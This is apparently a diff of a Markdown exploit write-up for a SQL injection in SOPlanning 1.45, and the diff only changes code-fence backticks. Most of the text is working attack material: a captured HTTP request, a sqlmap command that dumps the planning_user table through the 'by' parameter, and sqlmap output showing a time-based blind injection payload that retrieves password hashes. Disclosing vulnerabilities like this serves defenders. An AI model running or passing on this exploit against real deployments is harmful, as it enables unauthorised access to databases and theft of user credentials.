@@ -1,7 +1,7 @@
 The SOPlanning 1.45 application is vulnerable to SQL Injection which can be leveraged into getting the information for the users table.
 
 Capture the request in Burpsuite:
-````
+```
 GET /soplanning/www/projets.php?order=nom_createur&by=ASC HTTP/1.1
 
 Host: HOSTNAME
@@ -21,16 +21,16 @@ Connection: close
 Cookie: xposMois=0; dateDebut=14/02/2020; dateFin=14/04/2020; xposMoisWin=0; xposJoursWin=0; xposJours=0; yposMoisWin=0; yposMois=0; yposJoursWin=0; yposJours=0; PHPSESSID=0srffkdt9nu2jis443pp9nh3i9; soplanningplanning_=pnljrmetd5cse4d8dm1f09fn0u; baseLigne=users; baseColonne=jours; statut_projet=%5B%22abandon%22%2C%22archive%22%2C%22a_faire%22%2C%22en_cours%22%2C%22fait%22%5D
 
 Upgrade-Insecure-Requests: 1
-````
+```
 
 Feed the request into SQLMap:
-````
+```
 sqlmap -r projects.req --level=5 --risk=3 -p by --dbms=mysql -D soplanning -T planning_user --dump
 
-````
+```
 
 Then you will be able to see the information for the users in the database:
-````
+```
 root@kali:~/SOPlanning# sqlmap -r projects.req --level=5 --risk=3 -p by --dbms=mysql -D soplanning -T planning_user --dump
         ___
        __H__
@@ -56,7 +56,7 @@ Parameter: by (GET)
     Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
     Payload: order=nom_createur&by=ASC PROCEDURE ANALYSE(EXTRACTVALUE(9535,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x77464654))))),1)
 ---
-````
+```
 
 Because it's time based it will take a while to retrieve the user details, but you will retrieve password hashes.
 
